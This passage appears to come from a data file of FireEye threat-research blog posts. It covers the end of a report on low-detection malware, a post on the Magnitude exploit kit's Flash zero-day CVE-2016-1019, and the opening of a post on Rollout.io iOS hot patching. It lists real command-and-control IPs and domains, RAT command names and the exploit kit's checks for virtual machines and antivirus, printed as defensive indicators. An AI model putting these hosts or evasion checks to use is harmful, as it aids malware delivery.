  multiple layers of packing to disguise their malicious scripts or backdoors.</p>
 <p>For proper detection, it is essential to monitor an attack through
  its entire life cycle – not simply when a suspicious document or file
  first enters a network. This approach is necessary to detect and block
  multi-stage infection strategies. While initial events (such as the
  delivery of a macro-enabled spreadsheet) may appear innocuous,
  eventually a later stage of the attack will trigger detection.</p>
 <p>It is much easier to stop an attack – including a multi-stage attack
  – when it first occurs, to include detecting known and unknown
  exploits (zero days), or even threats that require user interaction
  such as macros inside documents.</p>
 <p>This detection approach is the core logic behind FireEye
  Multi-Vector Virtual Execution (MVX) technology.</p>
 <h5>
  <b>APPENDIX</b></h5>
 <p>
  <b>Indicators of Compromise - IOCs</b></p>
 <p>
  <b>Network Based:</b></p>
 <p>
  <b>4b3858c8b35e964a5eb0e291ff69ced6</b></p>
 <p>POST /0000/a242550.asp<br /> IP: 220.128.223.75<br /> TCP Port: 8080 </p>
 <p>
  <b>4e51143b01e99afc3bd908794d81d3cb</b></p>
 <p>GET /bbs/file/machinery/machine_body.jpg<br /> IP:
  cncauto.co.kr<br /> PORT: 80</p>
 <p>
  <b>8de1ebacb72f3b23a8235cc66a6b6f68</b></p>
 <p>IP: spl.noip.me<br /> TCP Port: 80</p>
 <p>
  <b>b1f43ca11dcf9e60f230b9d6d332c479</b></p>
 <p>IP: 31.168.144.18<br /> TCP Port: 443</p>
 <p>
  <b>aedd5d8446cc12ddfdc426cca3ed8bf0</b></p>
 <p>IP: 84.11.146.62<br /> TCP Port: 13661</p>
 <p>
  <b>497eddab53c07f4be1dc4a8c169261a5</b></p>
 <p>GET /ocagnt/gethooks.asp<br /> IP: 94.70.155.253<br /> TCP Port:
  80<br /> GET /ocagnt/enckeys<br /> IP: 94.70.155.253<br /> TCP Port:
  80<br /> GET /ocagnt/getstatus.asp<br /> IP: 94.70.155.253<br /> TCP
  Port: 80</p>
 <p>
  <b>dc15336e7e4579c9c04c6e4e1f11d3dd</b></p>
 <p>IP: dennyhacker.no-ip.org<br /> TCP Port: 81</p>
 <p>
  <b>Host-Based:</b></p>
 <p>dc15336e7e4579c9c04c6e4e1f11d3dd</p>
 <p>C:\Windows\System32\install\server.exe (copy of dropped binary) d409dc7e1ca0c86cb71e090591f16146</p>
 <p>%AppData%\Local\Temp\XX--XX--XX.txt</p>
 <p>Mutex created:<br /> _x_X_PASSWORDLIST_X_x_<br />
  x_X_BLOCKMOUSE_X_x_<br /> ***MUTEX***<br /> ***MUTEX***_PERSIST</p>
 <p>
  <b>497eddab53c07f4be1dc4a8c169261a5</b></p>
 <p>c:\octemp001\<br /> C:\octemp001\enccmdresults.txt<br />
  C:\octemp001\ikeycharvalue.txt<br />
  C:\octemp001\enchostnameres.txt<br /> C:\octemp001\certutil.txt<br />
  C:\octemp001\cert.txt<br /> C:\octemp001\commands.txt<br />
  C:\octemp001\prevcommands.txt<br />
  C:\octemp001\enccmdresults.txt<br />
  C:\octemp001\enccmdresults2.txt<br /> c:\octemp001\key.txt</p>
 <p>Figure 27 shows the MD5s with zero detection detailed on this report.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig27.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 27: 2015 samples from VT with zero
    detections in 2016</span></p>
 <p>Some exceptions to this study were added for samples with low
  detection rates, but with only generic detection (that is, not
  detected as part of any specific code family), that used an
  interesting technique or that were suspected of being used by an APT
  group (see Figure 28).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig28.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 28: Samples with low and / or generic detection</span></p>
 <p>
  <b>dc15336e7e4579c9c04c6e4e1f11d3dd</b> – Brazilian RAT</p>
 <p>Some interesting commands from the RAT in Portuguese language:</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""100%""> <tbody>
    <tr>
      <td valign=""top""><p> 0002A3A8: pingtest</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A3BC: tentarnovamente</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A3E0: mouseposition</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A3F8: keyboardkey</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A40C: webcaminactive</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A424: webcamgetbuffer</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A43C: webcam</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A44C: desktop</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A45C: stopsearch</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A470: listarvalores</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A488: maininfo</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A49C: configuracoesdoserver</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A4BC: disconnect</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A4D0: uninstall</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A4E4: renameservidor</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A4FC: enviarexecnormal</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A518: enviarexechidden</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A534: executarcomandos</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A550: openweb</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A560: downexec</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A574: resumetransfer</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A58C: listardrives</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A5A4: listararquivos</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A5BC: execnormal</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A5D0: execinv</p> </td> </tr>
    <tr>
      <td valign=""top""><p> 0002A5E0: deletardir</p> </td> </tr>
    <tr>
      <td valign=""top""> </td> </tr></tbody></table>
 <p>[1] Hangul Word Processor is a word processing application developed
  by South Korean software firm Hancom.<br /> [2]
  http://www.securityweek.com/zero-day-exploits-leaked-hacking-team-breach<br />
  [3]
  https://www.fireeye.com/blog/threat-research/2015/07/demonstrating_hustle.html<br />
  [4] https://msdn.microsoft.com/en-us/library/dd942138.aspx<br /> [5]
  An XLSB file is stored in binary format instead of the normal XML
  format, allowing the file to be read from and written to much faster. 
  See https://technet.microsoft.com/en-us/library/dd797428.aspx<br />
  [6] http://asec.ahnlab.com/1035<br /> [7]
  https://www.fireeye.com/content/dam/fireeye-www/global/en/blog/threat-research/FireEye_HWP_ZeroDay.pdf<br />
  [8]
  http://www.pcworld.com/product/997528/rlpack-basic-edition.html<br />
  [9]
  https://www.fireeye.com/blog/threat-research/2014/07/the-little-signature-that-could-the-curious-case-of-cz-solution.html<br />
  [10] Py2Exe is a distutils extension to create standalone windows
  programs from python scripts.  See
  https://sourceforge.net/projects/py2exe/.<br /> [11]
  https://github.com/rapid7/metasploit-framework/blob/master/modules/encoders/x86/shikata_ga_nai.rb<br />
  [12]
  http://www.howtogeek.com/163127/how-powershell-differs-from-the-windows-command-prompt/<br />
  [13]
  https://github.com/khr0x40sh/MacroShop/blob/master/macro_safe.py<br />
  [14]
  https://raw.githubusercontent.com/trustedsec/unicorn/master/unicorn.py<br />
  [15] http://blogs.technet.com/b/srd/archive/2013/06/11/ms13-051-get-out-of-my-office.aspx</p>",http://www.fireeye.com/blog/threat-research/2016/04/ghosts_in_the_endpoi.html
CVE-2016-1019: A New Flash Exploit Included in Magnitude Exploit Kit,"<p>On April 2, security researcher @Kafeine at Proofpoint <a href=""https://www.proofpoint.com/us/threat-insight/post/killing-zero-day-in-the-egg"">discovered
    a change to the Magnitude Exploit Kit</a>. Thanks to their
  collaboration, we analyzed the sample and discovered that Magnitude EK
  was exploiting a previously unknown vulnerability in Adobe Flash
  Player (CVE-2016-1019). The in-the-wild exploit achieves remote code
  execution on recent versions of Flash Player, but fails on the latest
  version (21.0.0.197).</p>
 <p>While version 21.0.0.197 is vulnerable to this exploit, execution
  fails because Adobe introduced new exploit mitigations in version
  21.0.0.182 of Flash Player. This was a great move from Adobe that
  shows how valuable innovations into exploit mitigations can be. Before
  the exploit kit authors could devise a way around the new mitigations,
  Adobe patched the underlying vulnerability.</p>
 <h5>Exploit Delivery Chain<br /> </h5>
 <p>Magnitude EK recently updated its delivery chain. It added a profile
  gate, just like Angler EK, which collects the screen’s dimensions and
  color depth (Figure 1).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flash%200day%20Genwei%20Jang/fig1.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. JS of Profile Gate</span></p>
 <p>The server responds with another profiling page, which tries to
  avoid sending exploits to users browsing from virtual machines or with
  certain antivirus programs installed (Figure 2). See the appendix for
  the full list of checks performed.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flash%200day%20Genwei%20Jang/fig2.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. JS of redirecting to main exploit page</span></p>
 <p>In our tests, Magnitude EK delivered the JSON double free exploit
  (CVE-2015-2419) and a small Flash loader that renders the new Flash
  exploit (Figure 3).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flash%200day%20Genwei%20Jang/fig3.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. JS of loading exploits</span></p>
 <h5>The Flash Exploit</h5>
 <p>A memory corruption vulnerability exists in an undocumented ASnative
  API. The exploit causes the flash memory allocator to allocate buffers
  under the attacker’s control. The attacker can then create a ByteArray
  of length 0xFFFFFFFF such that it can read and write arbitrary memory,
  as seen in Figure 4. The exploit’s code layout and some of the
  functionalities are similar to the leaked HackingTeam exploits, in
  that it downloads malware from another server and executes it.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flash%200day%20Genwei%20Jang/fig4.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 4. ActionScript of Flash exploits</span></p>
 <h5>Conclusion</h5>
 <p>This is not the first time that new exploit mitigation research
  rendered an in-the-wild zero-day exploit ineffective. Exploit
  mitigations are an invaluable tool for the industry, and their ongoing
  development within some of the most widely targeted applications –
  such as Internet Explorer/Edge and Flash Player – change the game.</p>
 <p>Despite regular security updates, attackers continue to target Flash
  Player, primarily because of its ubiquity and cross-platform reach. If
  Flash Player is required in your environment, ensure that you update
  to the latest version, and consider the use of mitigation tools such
  as <a href=""https://support.microsoft.com/en-us/kb/2458544"">EMET</a>
  from Microsoft.<br /> <br /> Click <a href=""https://helpx.adobe.com/security/products/flash-player/apsb16-10.html"">here</a>
  for the security bulletin issued by Adobe.</p>
 <h5>Acknowledgements</h5>
 <p>A huge thank you to @Kafeine, without whom this discovery would not
  be possible. His diligence continues to keep this industry at pace
  with exploit kit authors around the world.</p>
 <h5>Appendix</h5>
 <p>res://\Program%20Files%20(x86)\Fiddler2\Fiddler.exe/#3/#32512<br />
  res://\Program%20Files\Fiddler2\Fiddler.exe/#3/#32512<br />
  res://\Program%20Files%20(x86)\VMware\VMware
  Tools\TPAutoConnSvc.exe/#2/#26567<br />
  res://\Program%20Files\VMware\VMware
  Tools\TPAutoConnSvc.exe/#2/#26567<br />
  res://\Program%20Files%20(x86)\VMware\VMware
  Tools\TPAutoConnSvc.exe/#2/#30996<br />
  res://\Program%20Files\VMware\VMware
  Tools\TPAutoConnSvc.exe/#2/#30996<br />
  res://\Program%20Files%20(x86)\Oracle\VirtualBox Guest
  Additions\uninst.exe/#2/#110<br />
  res://\Program%20Files\Oracle\VirtualBox Guest
  Additions\uninst.exe/#2/#110<br />
  res://\Program%20Files%20(x86)\Parallels\Parallels
  Tools\Applications\setup_nativelook.exe/#2/#204<br />
  res://\Program%20Files\Parallels\Parallels
  Tools\Applications\setup_nativelook.exe/#2/#204<br />
  res://\Program%20Files%20(x86)\Malwarebytes
  Anti-Malware\mbamext.dll/#2/202<br />
  res://\Program%20Files\Malwarebytes
  Anti-Malware\mbamext.dll/#2/202<br />
  res://\Program%20Files%20(x86)\Malwarebytes
  Anti-Malware\unins000.exe/#2/DISKIMAGE<br />
  res://\Program%20Files\Malwarebytes
  Anti-Malware\unins000.exe/#2/DISKIMAGE<br />
  res://\Program%20Files%20(x86)\Malwarebytes
  Anti-Exploit\mbae.exe/#2/200<br /> res://\Program%20Files\Malwarebytes
  Anti-Exploit\mbae.exe/#2/200<br />
  res://\Program%20Files%20(x86)\Malwarebytes
  Anti-Exploit\mbae.exe/#2/201<br /> res://\Program%20Files\Malwarebytes
  Anti-Exploit\mbae.exe/#2/201<br />
  res://\Program%20Files%20(x86)\Malwarebytes
  Anti-Exploit\unins000.exe/#2/DISKIMAGE<br />
  res://\Program%20Files\Malwarebytes
  Anti-Exploit\unins000.exe/#2/DISKIMAGE<br />
  res://\Program%20Files%20(x86)\Trend
  Micro\Titanium\TmConfig.dll/#2/#30994<br />
  res://\Program%20Files\Trend
  Micro\Titanium\TmConfig.dll/#2/#30994<br />
  res://\Program%20Files%20(x86)\Trend
  Micro\Titanium\TmSystemChecking.dll/#2/#30994<br />
  res://\Program%20Files\Trend
  Micro\Titanium\TmSystemChecking.dll/#2/#30994<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Anti-Virus 6.0
  for Windows Workstations\shellex.dll/#2/#102<br />
  res://\Program%20Files\Kaspersky Lab\Kaspersky Anti-Virus 6.0 for
  Windows Workstations\shellex.dll/#2/#102<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Anti-Virus
  6.0\shellex.dll/#2/#102<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky Anti-Virus 6.0\shellex.dll/#2/#102<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Anti-Virus
  7.0\shellex.dll/#2/#102<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky Anti-Virus 7.0\shellex.dll/#2/#102<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Anti-Virus
  2009\mfc42.dll/#2/#26567<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky Anti-Virus 2009\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Anti-Virus
  2010\mfc42.dll/#2/#26567<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky Anti-Virus 2010\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Anti-Virus
  2011\avzkrnl.dll/#2/BBALL<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky Anti-Virus 2011\avzkrnl.dll/#2/BBALL<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Anti-Virus
  2012\x86\mfc42.dll/#2/#26567<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky Anti-Virus 2012\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Anti-Virus
  2013\x86\mfc42.dll/#2/#26567<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky Anti-Virus 2013\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Anti-Virus
  14.0.0\x86\mfc42.dll/#2/#26567<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky Anti-Virus 14.0.0\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Anti-Virus
  15.0.0\x86\mfc42.dll/#2/#26567<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky Anti-Virus 15.0.0\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Anti-Virus
  15.0.1\x86\mfc42.dll/#2/#26567<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky Anti-Virus 15.0.1\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Anti-Virus
  15.0.2\x86\mfc42.dll/#2/#26567<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky Anti-Virus 15.0.2\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Anti-Virus
  16.0.0\x86\mfc42.dll/#2/#26567<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky Anti-Virus 16.0.0\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Internet
  Security 6.0\shellex.dll/#2/#102<br />
  res://\Program%20Files\Kaspersky Lab\Kaspersky Internet Security
  6.0\shellex.dll/#2/#102<br /> res://\Program%20Files%20(x86)\Kaspersky
  Lab\Kaspersky Internet Security 7.0\shellex.dll/#2/#102<br />
  res://\Program%20Files\Kaspersky Lab\Kaspersky Internet Security
  7.0\shellex.dll/#2/#102<br /> res://\Program%20Files%20(x86)\Kaspersky
  Lab\Kaspersky Internet Security 2009\mfc42.dll/#2/#26567<br />
  res://\Program%20Files\Kaspersky Lab\Kaspersky Internet Security
  2009\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Internet
  Security 2010\mfc42.dll/#2/#26567<br />
  res://\Program%20Files\Kaspersky Lab\Kaspersky Internet Security
  2010\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Internet
  Security 2011\avzkrnl.dll/#2/BBALL<br />
  res://\Program%20Files\Kaspersky Lab\Kaspersky Internet Security
  2011\avzkrnl.dll/#2/BBALL<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Internet
  Security 2012\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files\Kaspersky Lab\Kaspersky Internet Security
  2012\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Internet
  Security 2013\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files\Kaspersky Lab\Kaspersky Internet Security
  2013\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Internet
  Security 14.0.0\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files\Kaspersky Lab\Kaspersky Internet Security
  14.0.0\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Internet
  Security 15.0.0\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files\Kaspersky Lab\Kaspersky Internet Security
  15.0.0\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Internet
  Security 15.0.1\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files\Kaspersky Lab\Kaspersky Internet Security
  15.0.1\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Internet
  Security 16.0.0\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files\Kaspersky Lab\Kaspersky Internet Security
  16.0.0\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Internet
  Security 15.0.2\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files\Kaspersky Lab\Kaspersky Internet Security
  15.0.2\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Total Security
  14.0.0\x86\mfc42.dll/#2/#26567<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky Total Security 14.0.0\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Total Security
  15.0.0\x86\mfc42.dll/#2/#26567<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky Total Security 15.0.0\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Total Security
  15.0.1\x86\mfc42.dll/#2/#26567<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky Total Security 15.0.1\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Total Security
  15.0.2\x86\mfc42.dll/#2/#26567<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky Total Security 15.0.2\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky Total Security
  16.0.0\x86\mfc42.dll/#2/#26567<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky Total Security 16.0.0\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky PURE
  2.0\x86\mfc42.dll/#2/#26567<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky PURE 2.0\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky PURE
  3.0\x86\mfc42.dll/#2/#26567<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky PURE 3.0\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky CRYSTAL
  3.0\x86\mfc42.dll/#2/#26567<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky CRYSTAL 3.0\x86\mfc42.dll/#2/#26567<br />
  res://\Program%20Files%20(x86)\Kaspersky Lab\Kaspersky
  PURE\mfc42.dll/#2/#26567<br /> res://\Program%20Files\Kaspersky
  Lab\Kaspersky PURE\mfc42.dll/#2/#26567</p>",http://www.fireeye.com/blog/threat-research/2016/04/cve-2016-1019_a_new.html
Rollout or Not: the Benefits and Risks of iOS Remote Hot Patching,"<h5>Previously On iOS Remote Hot Patching<br /> </h5>
 <p>Apple’s detailed app review process has resulted in greater security
  for iOS apps made available through the App Store. However, this
  review process can be lengthy, which negatively impacts developers who
  need to quickly patch a buggy or insecure app. As a result, we have
  seen the development of various third-party solutions that allow
  developers to remotely hot patch an iOS app on a non-jailbroken device
  without going through Apple’s review process. While iOS remote hot
  patching is a very recent concept and is still in its inception, we
  have seen fierce demand and an emerging market for such products.
  However, they are not without their own security risks.<br /> <br />
    <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2016/01/hot_or_not_the_bene.html"" target=""_blank"">In our January blog,</a> we discussed JSPatch, an
  open source hot patching solution. While JSPatch allows developers to
  provide better support to users by quickly fixing problematic apps, it
  potentially allows malicious actors to engage in attacks that evade
  current iOS security controls.<br /> <br /> In this episode, we take
  you on a tour of Rollout.io, a commercial (though currently with
  limited free access) solution that attempts to address the remote
  patching problem with an eye towards security.<br /> </p>
 <h5>Episode 2: Rollout.io<br /> </h5>
 <p>According to their website, Rollout is an Israel-based, venture
  capital-backed technology startup founded in 2014. The core product is
  a commercialized solution to the iOS patching problem that essentially
  allows developers to update their app’s behavior, following an app’s
  initial approval and release, without going through Apple’s App Store
  review process.<br /> <br /> Co-founder Erez Rusovsky stated that
  Rollout “created an SDK that allows you to remotely hot-patch native
  production applications”.  Rollout’s mission statement further states
  that:<br /> <br /> Rollout.io’s mission is to bridge the gap between
  developers and their live apps. When a live app needs updating, app
  developers usually wait days and even weeks to get the new version out
  to their users. Rollout solves this problem by giving developers
  code-level access to their live apps.<br /> <br /> Rollout is aware of
  the concerns within the community that patching apps outside of the
  App Store could be a violation of Apple’s review guidelines and
  practices. Rollout notes both <a href=""http://support.rollout.io/#section-does-rollout-io-comply-to-apple-s-app-store-guidelines-"" target=""_blank"">on their FAQ site</a> and in a longer blog post that
  their process is in compliance.</p>
 <h5>Technical Wonderland</h5>
 <p>JSPatch, which we discussed in our previous blog, provides a
  relatively simple patching framework consisting of three Objective-C
  files to be imported to an iOS app to activate the remote hot patching
  capability. As a commercial offering, Rollout offers a software
  development kit (SDK) and infrastructure that supports patching for
  scale and efficiency. Rollout provides a simple overview of their
  process, but also gives us an insider look into the tech stack and the
  “under the hood” mechanics of their Rollout SDK through their
  technical blogs. For our analysis, we focus only on the dissection of
  the Rollout SDK.<br /> <br /> In a nutshell, Rollout SDK is built on
  the following three technologies:<br /> <br /> ●    dSYM file<br />
  ●    Method Swizzling<br /> ●    JavaScriptCore framework</p>
 <h5>iOS Debug Symbol File</h5>
 <p>According to Rollout, the following steps are taken for an app to
  hook up with Rollout:<br /> The developer chooses to use Rollout SDK
  and imports the SDK into their app.<br /> The Rollout SDK parses the
  app code and generates the dSYM file (debug symbol file), which is
  uploaded to Rollout’s back end.<br /> The dSYM file is rendered in the
  developer portal and available to the app developer for use in
  reviewing and patching an app.<br /> </p>
 <p>The end result is rendered by Rollout’s developer portal and
  presented to the developers, allowing them to select and patch a
  function. Through the Rollout portal, the developer has easy access to
  all the defined classes (e.g. ViewController) and selectors (e.g.,
  imagePickerController:didFinishPickingMediaWithInfo:) of the analyzed
  app, as shown in Figure 1.<br /> <br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%201.png"" />
  <br />  <br /> <span class=""type-XS"">Figure 1: Rollout developer
    portal allowing the developer easy access to all defined classes and
    methods in the app</span>
  <br /> <br /> The most common way to patch a bug in an existing
  function is to replace the faulty implementation of the function with
  a new, fixed one. But there are situations where a fix is needed in
  multiple places across the application. In this case, the best
  practice is to create a new function that encapsulates the shared
  routine. In Rollout, one can easily achieve this through the interface
  shown in Figure 2.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%202.png"" />
  <br /> <br /> <span class=""type-XS"">Figure 2: Rollout developer portal
    allowing the developer to add a new method into a class</span>
  <br /> <br /> Rollout also allows developers to resolve problematic
  situations such as <a href=""http://support.rollout.io/docs/use-case-missing-ibaction-connection-in-a-xib"" target=""_blank"">when a method was renamed but still called from some
    code in the UI,</a> which requires the developer to link the
  disconnect by a new wrapper method. In this case, selecting a function
  to be fixed (such as [ViewController
  imagePickerController:didFinishPickingMediaWithInfo:] shown in Figure
  2) will display the JavaScript patch editing interface shown in Figure
  3.<br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%203.png"" />
  <br />  <br /> <span class=""type-XS"">Figure 3: Rollout develop portal
    providing a JavaScript editing interface for patch development</span>
  <br /> </p>
 <h5>Method Swizzling</h5>
 <p>
  <a href=""http://nshipster.com/method-swizzling/"" target=""_blank"">Method swizzling</a> is known to iOS developers as
  “black magic.” In short, method swizzling is an <a href=""https://developer.apple.com/library/mac/documentation/Cocoa/Reference/ObjCRuntimeRef/index.html"" target=""_blank"">Objective-C
    runtime technique</a> that allows one implementation of a method to
  replace an existing implementation of another method (of a class or
  instance) at runtime.<br /> <br /> The term “implementation” refers to
  the actual function pointer to the code (implementation) of the
  method. The Objective-C runtime maintains a struct called
  &quot;objc_method&quot; for each method of a class. This struct has
  the method name, the argument, the return types of the method, and the
  &quot;implementation&quot; of the method, which is represented by a
  pointer IMP pointing to a C function. Therefore, swizzling basically
  involves exchanging the value of the &quot;implementation&quot; field
  between the objc_method data of two different methods. Figure 4 and
  Figure 5 depict a visualization of the process:<br />  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%204.png"" />
  <br /> <span class=""type-XS"">Figure 4: The original selector and its
    implementation mapping in class FortitudeViewController before swizzling</span>
  <br />     <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%205.png"" />
  <br /> <span class=""type-XS"">Figure 5: The selector and implementation
    mapping in class FortitudeViewController after method swizzling</span>
  <br /> <br /> In Figure 4, which shows the state before swizzling,
  each selector in Class FortitudeViewController contains a
  corresponding pointer IMP that points to its real implementation,
  which is a C function behind the scene. For instance, selector1 is an
  objc_method struct that contains pointer IMP1.<br /> <br /> The
  “magic” lies in the availability of three essential C functions in the
  Objective-C runtime:<br /> <br /> ●  
   method_exchangeImplementations<br /> ●    class_replaceMethod<br />
  ●    method_setImplementation<br /> <br /> The most common and
  intuitive way to perform a method swizzling is similar to what is
  shown in Figure 6.<br />  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%206.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: Example code showing method swizzling</span>
  <br /> <br /> This code will turn the internal runtime relation of the
  relevant methods into the conceptual structure shown in Figure 5. This
  effectively allows one to replace an existing implementation of a
  function with a new one, thus leading to a new and uncharted behavior
  of an app at runtime.<br /> <br /> There have been many discussions
  about the pitfalls and dangers of utilizing this “black magic.” A
  primary focus is to avoid the unintended side effects of using the C
  function method_exchangeImplementations (shown above) by instead using
  class_replaceMethod and method_setImplementation. Further details are
  beyond the scope of this blog post.<br /> <br /> Apple does not seem
  to have provided any official documentation for the concept of method
  swizzling, despite documenting the <a href=""https://developer.apple.com/library/ios/documentation/Cocoa/Reference/ObjCRuntimeRef/index.html#//apple_ref/doc/uid/TP40001418-CH1g-188234"" target=""_blank"">associated
    runtime APIs</a>. However, it is a general consensus within the
  developer community that method swizzling is permitted. It should be
  noted that to date, Apple does not appear to have rejected an app
  during its review process due to the use of method swizzling.<br /> </p>
 <h5>JavaScriptCore.framework<br /> </h5>
